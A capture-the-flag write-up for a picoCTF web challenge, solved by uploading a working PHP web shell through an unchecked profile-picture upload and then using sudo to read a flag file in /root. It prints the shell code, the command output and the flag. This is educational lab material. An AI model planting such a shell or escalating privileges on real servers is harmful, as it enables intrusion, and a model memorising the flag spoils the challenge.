## Description
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.You can access the web application [here](http://standard-pizzas.picoctf.net:64354/)!
## Solve
1. First we connect to the challenge with the given link.

2. We can see a site where we can upload what it seem to be a profile picture, so let's try it.

3. Then, we got the next message: `The file null.png has been uploaded Path: uploads/null.png` and we can see in the URL that the site is using php. 

4. With this in mind and the challenge name, let's try to upload a file that is not an image, let's try to upload a php shell:
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```

5. Let's go to the path that the site says: `The file shell.php has been uploaded Path: uploads/shell.php`: http://standard-pizzas.picoctf.net:64354/uploads/shell.php

6. And now, we can execute commands:
```sh
sudo -l
#Matching Defaults entries for www-data on challenge:
#    env_reset, mail_badpass, #secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

#User www-data may run the following commands on challenge:
#    (ALL) NOPASSWD: ALL
```

7. Let's search on the /root directory:
```sh
sudo ls /root
#flag.txt
sudo cat /root/flag.txt
#picoCTF{wh47_c4n_u_d0_wPHP_712a9451}
```

8. And we got the flag:
```flag
picoCTF{wh47_c4n_u_d0_wPHP_712a9451}
```
